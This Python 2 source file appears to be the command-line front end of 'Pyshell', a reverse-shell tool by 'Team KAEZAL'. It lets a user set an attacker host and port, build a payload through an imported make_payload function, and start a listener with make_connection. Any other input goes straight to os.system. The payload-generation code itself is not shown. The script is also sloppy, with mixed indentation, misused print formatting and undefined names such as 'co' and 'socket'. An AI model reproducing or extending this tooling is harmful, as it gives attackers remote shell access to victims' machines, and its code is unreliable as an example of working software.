#!/usr/bin/env python2
import os, sys, subprocess,random
from time import sleep
from modules.pyshell import make_payload,make_connection
def slowprint1(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(10. / 200)
def slowprint2(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(5. / 1000)
def slowprint3(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(10. / 350)
reload(sys)
sys.setdefaultencoding("utf-8")
END='\033[0m'
host   = " "
port   = " "
taf    = '\033[5;49m'
code   = "False"
name   = " "
def re():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
def slowprint1(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(10. / 200)
sleep(2)
os.system('clear')
def logo():
  lo='''
 _  __          ______ ______         _       __   __
| |/ /    /\   |  ____|___  /   /\   | |      \ \ / /
| ' /    /  \  | |__     / /   /  \  | |       \ V / 
|  <    / /\ \ |  __|   / /   / /\ \ | |        > <  
| . \  / ____ \| |____ / /__ / ____ \| |____   / . \ 
|_|\_\/_/    \_\______/_____/_/    \_\______| /_/ \_\
                                          ______     
                                         |______|'''
  print(lo)
  print("""
\t %s%s
\t [*] Versions : 1.2
\t [*] Coded By : Team KAEZAL\n""") % (taf,END)
def help():
 slowprint2("""
  Commands :
       set host       : Change Your Host (Ex: set host IP)
       set port       : Change Your Port (Ex: set port 4444)
       set name       : Change Your Name Session and Payload
       show options   : Show [Host,Port,Name,Target,BG]
       make 	      : Make Your Payload 
       run            : Start The Listener
""")
def main():
    global port,host,name,payload,x

    while True:
        ask = raw_input('[*] User@Pyshell :~ ').lower()
        if ask == "help":
            help()
        elif ask == 'banner':
            os.system("clear")
            logo()
            main()
        elif "exit" in ask:
			sleep(0.5)
			print("\nGood Bye :)\n")
			sys.exit()
        elif "set host" in ask:
            host = ask.split()[-1]
	    print("Host => {}").format(host)
        elif "set port" in ask:
		try:
            		port = int(ask.split()[-1])
			print("Port => {}").format(str(port))
		except:
			print(co.red+'[-] Error ..'+END)
			sleep(0.2)
			main()
	elif "set name" in ask:
	    name = ask.split()[-1]
	    print ("Name => {}").format(name)
        elif ask == "show options":
            info=("\n[+] Your Host : %s\n[+] Your Port : %s\n[+] Session Name : %s\n") % (host,port,name)
	    slowprint2(info)
	    main()
        elif ask == "make":
            if host != " " and port != " " and name != " ":
                slowprint1("[+] bulding Payload [+]")
         	os.chdir('payloads')
                make_payload(host,port,name)
                os.chdir('..')
                sleep(2)
                slowprint2("[+] Completed [+]\n[!] Seved in payloads File")
                main()
     	    else:
 		print("""
[!] Host   : %s
[!] Port   : %s
[!] Name   : %s
""") % (host,port,name)
	elif ask=='exploit' or ask=='run' or ask=='start':
            if host != " " and port != " ":
		try:
			make_connection(host,port)
		except OverflowError:
			print ('[!] Long Port ..')
		except KeyboardInterrupt:
     			print("[!] Clossing The Connection ")
			sleep(1)
		except socket.error:
		    print("[!] Connection is Clossed ")
		    sleep(1)
            else:
                print ("\n[!] Host : %s\n[!] Port : %s\n") % (host,port)
	elif ask == "exit":
		sys.exit()
        else:
		os.system(ask)
		main()
def start():
    try:
        logo()
        main()
    except EOFError:
                import sys,os,time
                print("\n[!]  Detect to exit . . .")
                time.sleep(1)
                print("\n[!] Good Bye\n")
                sys.exit()
    except KeyboardInterrupt:
        	import sys,os,time
		print("\n[!]  Detect to exit . . .")
		time.sleep(1)
		print("\n[!] Good Bye\n")
		sys.exit()
if __name__ == "__main__":
    start()

